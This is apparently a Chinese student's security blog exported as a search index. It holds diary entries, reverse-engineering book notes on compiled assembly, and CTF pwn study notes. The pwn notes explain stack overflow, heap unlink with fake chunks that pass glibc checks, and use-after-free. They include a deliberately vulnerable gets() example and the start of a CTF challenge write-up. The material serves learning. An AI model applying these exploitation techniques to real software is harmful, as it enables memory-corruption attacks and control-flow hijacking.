<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>20190423</title>
      <link href="/2019/04/23/20190423/"/>
      <url>/2019/04/23/20190423/</url>
      
        <content type="html"><![CDATA[<p>把最初的Acid Burn那个逆向题又捡起来看了，之前爆破和key方法都试过了（这题包括了屏蔽弹窗、找固定key、爆破、注册算法各种解法，前一阵始终没能把这个的注册机搞定）。对照夜影师傅的文章算是对这道题的注册算法有了比较深刻的了解。<br>咬牙又花了三位数买了几本书，深入浅出密码学、龙书、程序员的自我修养。并且立下了大四之前<strong>不再买课外实体书</strong>的flag。<br>上了第一节系统分析与设计，感觉还是和UML一样让人头大，况且不像UML一样有一些实在的例子去学习，很担心这节课能不能坚持听下去了……<br>目前决定尽量每天都记一下发生的事情，如果做了题那就单写一篇笔记，向夜影师傅学习~<br>翻看夜影师傅的博客，有记载的是从17年5月24日做了第一道crackme，今天4月23日，差不多两年的时间，夜影师傅已经可以AK掉DDCTF的RE（包括移动端）了……<br>希望自己大三结束之前有机会参加一次XCTF的培训…<br>准备安排DYM（高中同学）来威海玩</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190422</title>
      <link href="/2019/04/22/20190422/"/>
      <url>/2019/04/22/20190422/</url>
      
        <content type="html"><![CDATA[<p>终于，在想了很久之后，把博客搭起来了。<br>虽然搭建的时候没添加一些花里胡哨的东西，但还是折腾了一两个小时。<br>以前没写过多少东西，索性不论质量先把文章都扔上来吧。<br>今天看了<a href="https://blog.csdn.net/whklhhhh" target="_blank" rel="noopener">奈沙夜影师傅的CSDN博客</a>，觉得像夜影师傅这样每天都坚持记下一点心得发布文章，对我来说还是有点难了。<br>目前还没想好怎么维护这个小小的博客，先走一步看一步了。<br>目前最要紧的事情大概是要复习操作系统/数据库/面向对象了，虽然Python第一个考试，但是考查课没什么需要慌的。<br>还是觉得Python课比较水，不知道考试会不会考Django + vue那些东西……</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程权威指南读书笔记-3</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-3/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本章以经典的hello world程序解释了在x86、x86-64、ARM、MIPS不同架构下不同编译环境产生的结果的差异</p></blockquote><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h4 id="MSVC2010"><a href="#MSVC2010" class="headerlink" title="MSVC2010"></a>MSVC2010</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_main proc</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">    <span class="keyword">push</span> offset $sg3830     <span class="comment">;对应字符串存储地址，笔记中没有记述全部的代码</span></span><br><span class="line">    <span class="keyword">call</span> _printf</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">4</span>              <span class="comment">;将栈指针移出，4对应32位字节数</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">_main endp</span><br></pre></td></tr></table></figure><p>汇编语言存在两种语体，Intel以及AT&amp;T，上述汇编语言为Intel语体</p><h4 id="GCC-4-4-1"><a href="#GCC-4-4-1" class="headerlink" title="GCC 4.4.1"></a>GCC 4.4.1</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main    proc <span class="built_in">near</span></span><br><span class="line">var_10  = <span class="built_in">dword</span> <span class="built_in">ptr</span> - <span class="number">10h</span></span><br><span class="line">        <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">        <span class="keyword">and</span> <span class="built_in">esp</span>, <span class="number">0fffffff0h</span>     <span class="comment">;使esp 16字节对齐</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, offset aHelloWorld        <span class="comment">;"Hello world\n"</span></span><br><span class="line">        <span class="comment">;先用eax存储字符串的地址</span></span><br><span class="line">        <span class="keyword">mov</span> [<span class="built_in">esp</span> + <span class="number">10h</span> + var_10], <span class="built_in">eax</span>   </span><br><span class="line">        <span class="keyword">call</span> _printf</span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0</span>      <span class="comment">;没有优化</span></span><br><span class="line">        <span class="keyword">leave</span></span><br><span class="line">        <span class="keyword">retn</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure><h4 id="GCC-4-7-3-AT-amp-T（常见于UNIX）"><a href="#GCC-4-7-3-AT-amp-T（常见于UNIX）" class="headerlink" title="GCC 4.7.3: AT&amp;T（常见于UNIX）"></a>GCC 4.7.3: AT&amp;T（常见于UNIX）</h4><p>小数点开头的指令为宏，可读性差，忽略宏之后代码如下:</p><p>(markdown不支持AT&amp;T语体代码高亮)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.lc0:</span><br><span class="line">        .string &quot;hello, world\n&quot;</span><br><span class="line">main:</span><br><span class="line">        pushl %ebp</span><br><span class="line">        movl %esp, %ebp</span><br><span class="line">        andl $-16, %esp</span><br><span class="line">        subl $16, %esp</span><br><span class="line">        movl $.lc0, (%esp)</span><br><span class="line">        call printf</span><br><span class="line">        movl $0, %eax</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure></p><p>Intel与AT&amp;T区别：</p><ul><li>运算表达式书写顺序相反</li><li>AT&amp;T中在寄存器前加%，在立即数前加$，使用圆括号（Intel使用方括号）</li><li>AT&amp;T运算操作符需要声明操作数类型</li><li><ol><li>-q quad(64位)</li></ol></li><li><ol start="2"><li>-l 32位long</li></ol></li><li><ol start="3"><li>-w 16位word</li></ol></li><li><ol start="4"><li>-b 8位byte</li></ol></li><li>……</li></ul><h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><h4 id="MSVC-2012-x64"><a href="#MSVC-2012-x64" class="headerlink" title="MSVC 2012 x64"></a>MSVC 2012 x64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main    proc</span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">lea</span> <span class="built_in">rcx</span>, offset flat:$sg2989</span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure><p>64位寄存器在32位基础上扩展，仍可用e开头正常使用32位寄存器</p><h4 id="GCC-4-4-6-X64"><a href="#GCC-4-4-6-X64" class="headerlink" title="GCC 4.4.6 X64"></a>GCC 4.4.6 X64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.string</span> <span class="string">"Hello world\n"</span></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, offset flat:.lc0   <span class="comment">;"hello world"</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>前六个参数保存在寄存器中；对E寄存器使用mov写入时，对应的R寄存器高32位会被置0</p><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><h4 id="Keli-6-2013-ARM模式"><a href="#Keli-6-2013-ARM模式" class="headerlink" title="Keli 6/2013 ARM模式"></a>Keli 6/2013 ARM模式</h4><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">main</span></span><br><span class="line">        <span class="keyword">stmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">lr</span>&#125;     <span class="comment">;相当于push，把r4和lr(link register)的值放到数据栈中</span></span><br><span class="line">        <span class="keyword">adr </span><span class="built_in">r0</span>, aHelloWorld     <span class="comment">;将字符串偏移与pc相加，结果存储到r0</span></span><br><span class="line">        <span class="keyword">bl </span>__2printf    <span class="comment">;将下一条指令地址存入lr，将printf()地址写入pc</span></span><br><span class="line">        <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">ldmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">pc</span>&#125;     <span class="comment">;与stmfd相反，类似popj</span></span><br></pre></td></tr></table></figure><p>ARM的sp寄存器相当于x86架构下的sp/esp/rsp的集合<br><br>ARM的pc相当于x86的ip/eip/rip</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 入门 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程权威指南读书笔记-2</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="最简函数"><a href="#最简函数" class="headerlink" title="最简函数"></a>最简函数</h1><blockquote><p>本章以一个函数<code>int f(){return 123;}</code>在不同指令集下的编译结果，简单描述了指令集间的差异。</p></blockquote><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">f:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">123</span></span><br><span class="line">    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f <span class="meta">proc</span></span><br><span class="line">    <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0x7b</span> <span class="comment">; 123</span></span><br><span class="line">    <span class="keyword">bx </span><span class="built_in">lr</span></span><br><span class="line">    <span class="meta">endp</span></span><br></pre></td></tr></table></figure><p>ARM中，r0保存函数返回值，lr保存返回地址（区别于x86的函数栈），bx为跳转指令。</p><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">j </span>$<span class="number">31</span></span><br><span class="line">li $<span class="number">2</span>, <span class="number">123</span>     <span class="comment"># 0x7b</span></span><br></pre></td></tr></table></figure><p>j为跳转，$31、$2表示寄存器，根据RISC的特性，赋值语句在转移指令之前执行，因此顺序颠倒。</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 入门 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程权威指南读书笔记-1</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="CPU简介"><a href="#CPU简介" class="headerlink" title="CPU简介"></a>CPU简介</h1><blockquote><p>一些基本概念：指令码、机器码、汇编语言、寄存器</p></blockquote><p>本书使用的CPU架构：</p><ul><li>x86</li><li>x86-64</li><li>ARM64</li><li>ARM(属于RISC CPU)<blockquote><p>Thumb模式(指令为2字节大小)节省了传统ARM统一指令码长度为4字节的情况下占用空间较大的问题。需要注意Thumb不能封装所有ARM指令，传统ARM的4字节模式可以和Thumb模式同时存在</p><blockquote><p>Thumb-2模式包含了2字节指令和4字节指令，但不是简单的Thumb与ARM的复合，而是一种独立运行模式，应用于iPod、iPhone、iPad应用程序，Xcode编译器默认使用此模式编译</p></blockquote></blockquote></li></ul><p><b>ARM指令集分三类，ARM、ARM64、Thumb(Thumb-2)</b></p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 入门 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假任务笔记</title>
      <link href="/2019/04/22/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/04/22/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>因为之前已经有一定基础，所以假期的学习重点放在了补充基础知识上，顺便针对性地做了几道有代表性的题，每道题的知识点是很单一的栈溢出/格式化字符串/堆溢出，但是也不算简单到秒杀级别，因为会夹杂一些坑，并且出题人挖的坑一个不剩的全踩到了……</p></blockquote><h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h3><blockquote><p>这部分主要是放一些基础的做题前置知识，以前学过的和新掌握的都放在一起了。</p></blockquote><h5 id="1-汇编、栈溢出"><a href="#1-汇编、栈溢出" class="headerlink" title="1.汇编、栈溢出"></a>1.汇编、栈溢出</h5><p>常见寄存器如图</p><p><img src="http://www.cs.virginia.edu/~evans/cs216/guides/x86-registers.png" alt="Please wait while loading image." title="x86"></p><p>其中重点在于ESP、EBP。esp用于保存栈顶指针，ebp保存栈底（主要和栈帧联系在一起）。<br>下面谈一个栈溢出的前置知识：栈帧</p><ul><li>栈帧实际上就是函数调用的记录。CPU没有多余的寄存器保存多个函数的返回地址，而一旦出现2个以上函数的嵌套调用，外部函数的返回地址以及局部变量等数据就需要临时保存，保存的方法就需要用到栈帧实现。</li><li>栈帧存储在栈上，其本身也按栈结构进行存储。栈帧一块块地存储在栈上，就导致寄存器的ebp不断改变，因此ebp也需要在函数调用的时候压入栈帧保存。栈帧的实际结构如下：</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/5418798-1c45c860220f0dfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/374" alt="Please wait while loading image." title="栈帧"></p><ul><li>在生成栈帧时，先将返回地址压入栈中，再压入ebp。设想，程序设计者开辟了一个数组用于保存用户输入，运行时这个数组对应的空间位于图中ebp的上部，此时，若程序未对用户输入做长度鉴定，用户此时输入了一个大于数组大小的字符串，系统不会自动为输入做出检查，只会按事先写好的步骤，将字符串一点点存入栈中，多出来的部分同样会被存入，而预留的空间已经不足，这种情况下溢出就发生了。多余的字符串会按顺序覆盖掉栈上的ebp、返回地址，导致返回地址异常，从而使程序崩溃。</li></ul><h5 id="2-工具"><a href="#2-工具" class="headerlink" title="2.工具"></a>2.工具</h5><p>做pwn题不太强调逆向能力，一般只需要使用IDA反汇编，大致阅读，或者干脆F5反编译直接阅读C代码，理清代码的大致思路即可。在一些题目中，出题者会实现写好获取flag的函数，但并不在main中使用，此时还需要在IDA中查看左侧函数表，观察是否有这类和shell直接相关的未调用函数（也可使用r2的aa功能）。<br>为了查看程序所开启的保护，可使用checksec（随pwnlib安装）来查看。<br>为了写exp，python的pwn库基本是必不可少的（其实直接用C程序写exp更直接，也并不麻烦，只是pwn用的人越来越多，集成的功能也越来越多，基本没有人用C写了）。pwn中最基础的操作，如recv()、process()、interactive()、p32()、sendline()等等，只需简单使用一遍就可以上手，pwn的其他的功能则需要多看官方说明（如直接生成shellcode等等）。</p><h5 id="3-堆"><a href="#3-堆" class="headerlink" title="3.堆"></a>3.堆</h5><p>由于堆的内容很多，我也只是研究了一部分，没办法写一个总结，就先把学习的视频链接贴上来了……原视频是在YouTube上的，为了不用每次特意挂梯子去看视频，我把视频搬运到B站了。<a href="https://www.bilibili.com/video/av43948832/" target="_blank" rel="noopener">链接</a></p><h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><blockquote><p>主要是栈溢出，格式化字符串的原理比较简单，月刊里写得很详细了。</p></blockquote><h5 id="1-栈溢出"><a href="#1-栈溢出" class="headerlink" title="1.栈溢出"></a>1.栈溢出</h5><p>结合栈帧的知识，栈溢出实际上就是构造一个输入，使输入的内容恰好覆盖到ebp下面的返回地址上，这样当函数返回时就会按攻击者输入的地址返回，返回地址会被存储到eip中，也就是程序将要执行的下一条指令。</p><p><img src="https://upload-images.jianshu.io/upload_images/5418798-738c7fdf09073b61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/946" alt="Please wait while loading image." title="stack overflow"></p><p>例：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>C语言课上老师提到过gets()函数并不好，不推荐使用，因为gets()不会对输入做出长度检测，因此很容易导致栈溢出。上面的代码由于在vulnerable()中使用了gets()，因此攻击者可以通过构造一个字符串，将它的返回地址覆盖为success()的首地址，这样在vulnerable()返回后会在屏幕上输出”You already controlled it.”现代操作系统已经实现了多种缓解栈溢出攻击的方法，如canary保护、NX保护、ASLR等机制，上述代码也只有在编译器关闭了众多保护机制的前提下才能实现简单的栈溢出攻击，否则需要各种机制的应对措施来绕过机制，使得栈溢出的利用受限。<br>假期还大致学习了NX、ASLR的绕过，参考的<a href="https://sploitfun.wordpress.com/" target="_blank" rel="noopener">SploitFun</a><br>关于栈溢出的介绍内容补充见i春秋月刊</p><h5 id="2-堆溢出"><a href="#2-堆溢出" class="headerlink" title="2.堆溢出"></a>2.堆溢出</h5><p>堆溢出的原理和栈溢出相同，但由于堆的chunk结构复杂，并且一般在堆中没有返回地址，因此堆溢出之后的利用也相对复杂。大致思路（以unlink溢出为例），是仿照chunk的格式，计算偏移，在chunk的data后面再手动写上一个prev_size、chunk_size以及fd、bk指针，以此达到伪造一个堆块的效果，随后写入的shellcode会覆盖掉free()的GOT地址。之后，若程序要调用free()，就会实际上执行shellcode，实现攻击者的目的。</p><ul><li>unlink</li></ul><p>假设堆上有若干个chunk：chunk0、chunk1、chunk2、chunk3<br>四个chunk都正在使用，这时我们正常free掉chunk2<br>之后chunk2的size后面多了fd、bk，并且chunk2指针存入bin中<br>假设chunk1可以溢出，那么就可以通过chunk1溢出到chunk2，修改chunk2的fd、bk<br>把fd修改为[目标地址-12]，bk修改为目标值（任意地址写的地址，和写进去的值）</p><p>再free掉chunk1，因为chunk1的bk指向chunk2，fd指向chunk0，而只有chunk2是freed chunk<br>所以触发了unlink机制，unlink机制要对<strong>chunk2</strong>进行操作，以合并chunk1和chunk2</p><p>这里FD、BK指的是<strong>被unlink的</strong>chunk的fd、bk指向的chunk<br>此时unlink认为chunk2的FD为[目标地址-12]<br>同理，unlink认为chunk2的BK为目标值</p><p>确认了FD和BK，unlink将会进行双向链表的节点删除处理<br>unlink会执行 ：</p><ol><li>FD-&gt;bk = BK，unlink为了确定bk，需要通过chunk2的指针来计算（计算方法为FD加上3倍的size字段大小，32位下为12），而FD=[目标地址-12]所以FD-&gt;bk就相当于目标地址，unlink要把BK赋值给目标地址，此时，目标值就复制到了目标地址</li><li>BK-&gt;fd = FD，同理，BK-&gt;fd需要加2倍的字段大小，32位下是8，因此unlink将[目标地址-12]复制到了[目标值+8]，貌似没什么用，前一步已经完成了这个操作。</li></ol><p>现代glibc为了应对上述情况的发生，在unlink前加了一个检测步骤，即检测P-&gt;fd-&gt;bk是否指向P，P-&gt;bk-&gt;fd是否指向P（P为chunk2）<br>把前面构造的fake chunk带入这个检测，FD-&gt;bk指向的是目标地址，不是P，不能通过检测<br>因此为了应对检测，需要改变改写的fake chunk的fd和bk</p><p>详细解释下unlink后的操作：</p><p>（P_ptr是需要事先获取的）<br>在这里将chunk2的fd设置成chunk2指针减去12（FD = P_ptr - 12），fd设置成chunk2指针减去8（BK = P_ptr - 8）<br>这里的FD、BK是unlink认为的，不是正常理解下的chunk1和chunk3</p><p>这样设置之后，unlink前的指针检查就会变为如下：<br>unlink计算FD-&gt;bk时，会使用FD，把FD加上12，而伪造的FD实际上是P_ptr - 12，计算后得到P_ptr，也就是指向chunk2的指针<br>同理BK-&gt;fd经过计算也会得到指向chunk2的指针<br>这样伪造的fd bk就通过了unlink前的检查，chunk2将会被unlink，合并到chunk1</p><p>按之前提到过的unlink的执行步骤进行：</p><ol><li>FD-&gt;bk = BK，刚刚提过，FD-&gt;bk就是chunk2，这个指针存储在bin list中，执行后，指针变为P_ptr - 8</li><li>BK-&gt;fd = FD，这里BK-&gt;fd依然是chunk2，执行后，指针变为P_ptr - 12<br>可以看出，这里的第一步结果被第二部的结果覆盖掉，unlink后的实际结果，仅相当于执行了第二步<br>最终bin list中指向chunk2的指针指向了chunk2 - 12的地址处，这个指针一般存在于BSS段，<br>因此可以通过修改指针对任意地址读写。</li></ol><ul><li>UAF</li></ul><p>UAF，即free后使用，free后未将指针置为NULL，造成悬空（也就是野指针），之后想办法将这块内存再次获取回来，写入值，此时的新指针和野指针同时指向这块内存，也就可以利用野指针来操作这块内存的数据，造成任意读写。<br>举个栗子：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> stu_id</span><br><span class="line">    <span class="keyword">char</span>* stu_name;</span><br><span class="line">    <span class="keyword">int</span> *()(<span class="keyword">void</span>);</span><br><span class="line">&#125;stu;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure></p><p>假设有符合上述结构体的元素stu0，程序此时要free掉stu0，但是忘记将stu0的指针置空，现在我们有一个stu0的指针了。我们需要想办法再次使用stu0这块内存，最简单的办法就是再通过程序申请一个同样大小的块，此时堆管理器会按照管理机制将刚刚释放掉的stu0再度利用，由此我们得到第二个指向stu0的指针，我们控制这个新指针正常对stu_id和stu_name进行赋值，假设stu_name值为AAAA(0x41414141)，打印野指针的stu_name，就会将stu_name的值解引用打印出0x41414141地址处的值，同理如果是通过野指针调用结构体内部函数，会将该地址解引用劫持控制流到任意地址。</p><h3 id="三、pwn题"><a href="#三、pwn题" class="headerlink" title="三、pwn题"></a>三、pwn题</h3><h5 id="1-magic"><a href="#1-magic" class="headerlink" title="1.magic"></a>1.<a href="https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/1" target="_blank" rel="noopener">magic</a></h5><p><a href="https://bamboofox.cs.nctu.edu.tw/uploads/challenge/attachments/1/magic" target="_blank" rel="noopener">题目下载</a></p><p>题目线索给出了两个关键函数源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_magic</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        buf[i] ^= rand()%<span class="number">256</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> magic_str[<span class="number">60</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">    do_magic(magic_str, <span class="built_in">strlen</span>(magic_str));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过在虚拟机下运行程序，得到如下结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  magic ./magic </span><br><span class="line">Welcome to Magic system!</span><br><span class="line">Give me your 